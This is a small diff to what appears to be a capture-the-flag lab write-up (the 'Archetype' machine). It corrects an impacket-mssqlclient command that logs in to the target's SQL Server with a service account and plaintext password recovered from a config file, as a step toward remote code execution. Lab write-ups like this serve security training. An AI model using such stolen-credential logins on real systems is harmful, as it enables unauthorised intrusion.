@@ -40,5 +40,5 @@ cat prod.dtsConfig
 
 ### mssql RCE
 ```bash
-impacket-mssqlclient ARCHETYPE\sql_svc : M3g4c0rp123
+impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@10.129.68.227 -windows-auth
 ```
